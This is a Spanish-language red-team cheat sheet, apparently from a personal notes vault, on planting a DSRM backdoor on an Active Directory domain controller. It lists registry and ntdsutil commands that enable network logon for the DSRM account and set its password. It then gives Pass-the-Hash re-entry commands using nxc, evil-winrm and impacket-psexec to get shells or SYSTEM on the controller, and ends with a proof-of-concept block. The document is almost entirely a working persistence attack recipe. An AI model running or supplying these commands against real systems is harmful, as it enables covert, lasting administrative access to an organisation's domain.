---
aliases:
  - DSRM Backdoor Setup
tags:
  - technique/persistence
  - asset/active-directory
  - env/windows
  - cred/ntlm
primary categories:
  - "[[Red Team]]"
secondary categories:
  - "[[Active Directory]]"
tertiary categories:
  - "[[Active Directory Explotación]]"
kind: SubCheatSheet
linked:
  - "[[DSRM Backdoor]]"
  - "[[Pass-the-Hash]]"
---
# DSRM Backdoor - Backdoor y Re-entry

> Por default la cuenta DSRM solo sirve booteando en modo restore. `DsrmAdminLogonBehavior=2` la habilita para **login por red** → re-entry vía Pass-the-Hash.

---

## Habilitar el Backdoor

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---|:---|:---|
| `reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v DsrmAdminLogonBehavior /t REG_DWORD /d 2` | Permite login de la cuenta DSRM por red | Activar el backdoor (en el DC). |
| `New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa" -Name DsrmAdminLogonBehavior -Value 2 -PropertyType DWORD -Force` | Igual con PowerShell | Alternativa. |
| `ntdsutil "set dsrm password" "reset password on server null" q q` | Setear el password DSRM a uno conocido | Controlar el hash/clave. |
^dsrm-backdoor-enable

## Re-entry (Pass-the-Hash con la cuenta local)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---|:---|:---|
| `nxc smb $DC -u Administrator -H <DSRM_HASH> --local-auth` | Login al DC con el hash DSRM (cuenta **local**, por eso `--local-auth`) | Acceso persistente. |
| `evil-winrm -i $DC -u Administrator -H <DSRM_HASH>` | Shell por WinRM con el hash DSRM | Re-entry interactivo. |
| `impacket-psexec -hashes :<DSRM_HASH> Administrator@$DC` | SYSTEM en el DC vía PtH local | Ejecución. |
^dsrm-backdoor-reentry

### PoC

```text
:: En el DC, como DA ::
reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v DsrmAdminLogonBehavior /t REG_DWORD /d 2

:: Re-entry (cuenta LOCAL del DC) ::
nxc smb dc01 -u Administrator -H <DSRM_NTLM_HASH> --local-auth
```

> [!warning] `--local-auth`
> La cuenta DSRM es local del DC, no de dominio. Siempre autenticar con `--local-auth` / como cuenta local.
